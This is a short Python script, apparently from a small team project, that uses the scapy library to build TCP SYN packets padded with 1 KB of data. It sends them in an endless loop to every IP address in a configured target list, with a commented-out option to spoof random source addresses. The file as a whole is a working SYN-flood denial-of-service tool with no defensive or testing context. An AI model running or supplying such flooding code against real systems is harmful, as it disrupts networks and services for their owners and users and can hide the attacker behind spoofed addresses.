# imports
from Utility_Functions import utils as u
from scapy.layers.inet import *
import Common_Variables as cmnVar
from scapy.all import *

# TODO 31/03/2023 alush: ask Nadav why attempting to connect to another PC is not working


for target_ip in cmnVar.IP_list:
    # IP class which consist of the source and target IPs
    ip = IP(src=cmnVar.source_ip, dst=target_ip)
    # for spoofing
    # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
    # protocol class uses the source port, destination port and the flag which currently stands for SYN in the TCP
    tcp = TCP(sport=cmnVar.source_port, dport=cmnVar.target_port, flags="S")
    # payload of the packet, which currently is KB of data
    raw = Raw(b"X" * 1024)
    # stacking the pack
    p = ip / tcp / raw
    # send the packet
    send(p, loop=1, verbose=0)
